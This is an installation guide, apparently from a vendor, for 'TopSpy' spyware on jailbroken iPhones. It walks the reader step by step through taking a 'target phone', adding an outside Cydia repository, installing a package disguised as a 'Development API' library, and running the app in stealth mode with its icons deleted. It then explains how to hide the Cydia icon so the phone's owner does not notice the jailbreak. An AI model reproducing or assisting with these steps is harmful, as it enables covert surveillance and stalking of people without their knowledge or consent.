TopSpy works ONLY on jailbroken iPhones! Find out how to jailbreak here

GPS must be turned ON before installation

  1. Take the target phone
  2. Find the Cydia icon and tap on it. If you don’t have it, it means the device is not jailbroken.

  3. Don't worry: the target phone user will not understand that the device is jailbroken. We can offer you a great tool that will help you hide the Cydia icon.

  4. Tap Manage

  5. Тар Sources

  6. Tap Edit

  7. Tap Add

  8. Enter URL http://repo.gr1m.com and tap Add Sources

  9. Wait while Cydia is updating sources and tap Return to Cydia

     

  10. Find "Development API" and Tap on it

  11. Tap on package "Core Library"

  12. Tap Install and then Confirm

     

  13. If this is your first installation of TopSpy, wait for 15 seconds until the "My Location" Would Like to Use Your Current Location window pops-up and tap "OK". Don't click on Restart SpringBoard button. If not – Proceed with Restart Springboar button

      

  14. Now tap Restart SpringBoard. Now phone will be respringed

     

  15. Find and tap on icon "TopSpy". If it's not your first installation on this device and you are the customer, phone will be respringed and the icons and files are deleted. Device will be detected in your control panel

  16. Accept License Agreement

  17. Enter your registration e-mail and tap register

     

  18. Wait for the message "All Good. Now exit from application", tap "Ok"

  19. Press "Home" button

  20. Don't worry =) it's SpringBoard restarting

  21. The application is running and successfully works in stealth mode. All the icons and files are deleted automatically

  22. If the target phone was not jailbroken before installation and you want to keep the jailbreak hidden, you can hide the Cydia App icon. You do that by opening up Cydia:

    Go back to the Developer's Repo and choose the Hide Cydia package. Tap on Install and press Confirm. Restart SpringBoard when it's done. Now when you unlock the phone, you will see that the Cydia icon disappeared. So, the target user will not know that the phone was jailbroken.

I'm done! Start Tracking
